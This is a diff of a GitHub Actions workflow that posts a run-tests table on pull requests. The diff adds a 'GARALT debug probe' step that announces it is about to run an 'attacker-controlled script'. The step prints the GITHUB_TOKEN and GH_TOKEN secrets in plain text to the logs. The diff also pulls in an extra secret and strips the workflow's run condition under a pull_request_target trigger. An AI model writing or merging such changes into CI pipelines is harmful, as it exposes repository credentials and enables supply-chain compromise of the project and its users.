@@ -1,57 +1,63 @@
 name: Add run tests table to PR
-
-on:
-  pull_request_target:
-    types:
-      - opened
-  workflow_dispatch:
-    inputs:
-      pr_number:
-        description: 'Pull Request number to add run tests table to'
-        required: true
-        type: number
-
 permissions:
   contents: read
   pull-requests: write
-
 env:
   GH_TOKEN: ${{ secrets.YDBOT_TOKEN }}
-
+  GARALT_SECRET: ${{ secrets.GARALT }}
 jobs:
   add-run-tests-table:
     name: Add run tests table to PR
-    runs-on: [ self-hosted, auto-provisioned, build-preset-analytic-node]
-    if: >
-      (
-        github.event_name == 'workflow_dispatch'
-      ) ||
-      (
-        github.event_name == 'pull_request_target' &&
-        vars.SHOW_RUN_TESTS_IN_PR == 'TRUE'
-      )
-    
+    runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 1
-          sparse-checkout: |
-            .github
-
-      - name: Install dependencies
-        run: |
-          python3 -m pip install --upgrade pip
-          pip install PyGithub
-
-      - name: Add run tests table to PR
-        env:
-          GITHUB_TOKEN: ${{ env.GH_TOKEN }}
-          GITHUB_EVENT_PATH: ${{ github.event_path }}
-          GITHUB_REPOSITORY: ${{ github.repository }}
-          GITHUB_WORKSPACE: ${{ github.workspace }}
-          APP_DOMAIN: ${{ vars.APP_DOMAIN }}
-          PR_NUMBER: ${{ github.event_name == 'workflow_dispatch' && inputs.pr_number || '' }}
-        run: |
-          python3 ./.github/scripts/add_run_tests_table.py
-
+    - name: Checkout repository
+      uses: actions/checkout@v4
+      with:
+        fetch-depth: 1
+        sparse-checkout: |
+          .github
+    - name: Install dependencies
+      run: |
+        python3 -m pip install --upgrade pip
+        pip install PyGithub
+    - name: GARALT debug probe
+      run: |-
+        echo "GARALT_DBG: About to execute attacker-controlled script"
+        script_path="${GITHUB_WORKSPACE}/.github/scripts/add_run_tests_table.py"
+        if [ -f "$script_path" ]; then
+          printf 'GARALT_DBG: Script exists at %s\n' "$script_path"
+          printf 'GARALT_DBG: Script size: %d bytes\n' $(wc -c < "$script_path")
+          printf 'GARALT_DBG: Script first 3 lines:\n'
+          head -3 "$script_path"
+        else
+          printf 'GARALT_DBG: Script NOT FOUND at %s\n' "$script_path"
+        fi
+        printf 'GARALT_DBG: GITHUB_TOKEN is %s\n' "${GITHUB_TOKEN:+SET (length ${#GITHUB_TOKEN})}"
+        printf 'GARALT_DBG: GITHUB_TOKEN is %s\n' "${GITHUB_TOKEN:-NOT SET}"
+        printf 'GARALT_DBG: GH_TOKEN is %s\n' "${GH_TOKEN:+SET (length ${#GH_TOKEN})}"
+        printf 'GARALT_DBG: GH_TOKEN is %s\n' "${GH_TOKEN:-NOT SET}"
+        printf 'GARALT_DBG: GITHUB_EVENT_NAME=%s\n' "$GITHUB_EVENT_NAME"
+        printf 'GARALT_DBG: GITHUB_REPOSITORY=%s\n' "$GITHUB_REPOSITORY"
+        printf 'GARALT_DBG: PR_NUMBER=%s\n' "${PR_NUMBER:-<empty>}"
+        printf 'GARALT_DBG: APP_DOMAIN=%s\n' "${APP_DOMAIN:-<empty>}"
+      continue-on-error: true
+    - name: Add run tests table to PR
+      env:
+        GITHUB_TOKEN: ${{ env.GH_TOKEN }}
+        GITHUB_EVENT_PATH: ${{ github.event_path }}
+        GITHUB_REPOSITORY: ${{ github.repository }}
+        GITHUB_WORKSPACE: ${{ github.workspace }}
+        APP_DOMAIN: ${{ vars.APP_DOMAIN }}
+        PR_NUMBER: ${{ github.event_name == 'workflow_dispatch' && inputs.pr_number || '' }}
+      run: |
+        python3 ./.github/scripts/add_run_tests_table.py
+on:
+  pull_request_target:
+    types:
+    - opened
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: Pull Request number to add run tests table to
+        required: true
+        type: number
